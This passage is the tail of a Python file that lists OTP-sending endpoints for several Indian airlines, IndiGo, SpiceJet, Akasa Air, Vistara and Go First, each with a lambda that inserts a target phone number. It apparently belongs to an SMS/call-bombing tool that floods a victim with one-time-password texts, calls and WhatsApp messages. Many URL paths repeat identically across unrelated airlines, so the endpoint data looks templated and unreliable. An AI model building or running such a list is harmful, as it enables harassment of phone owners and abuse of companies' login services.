    {"name": "IndiGo Call", "url": "https://www.goindigo.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "IndiGo WhatsApp", "url": "https://goindigo.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "SpiceJet SMS", "url": "https://www.spicejet.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "SpiceJet Call", "url": "https://www.spicejet.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "SpiceJet WhatsApp", "url": "https://spicejet.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Akasa Air SMS", "url": "https://www.akasaair.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Akasa Air Call", "url": "https://www.akasaair.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Akasa Air WhatsApp", "url": "https://akasaair.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Vistara SMS", "url": "https://www.airvistara.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Vistara Call", "url": "https://www.airvistara.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Vistara WhatsApp", "url": "https://airvistara.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Go First SMS", "url": "https://www.flygofirst.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Go First Call", "url": "https://www.flygofirst.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Go First WhatsApp", "url": "https://flygofirst.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
]

# Total APIs loaded
print(f"✅ APIs1.py Loaded {len(ULTIMATE_APIS)} APIs")
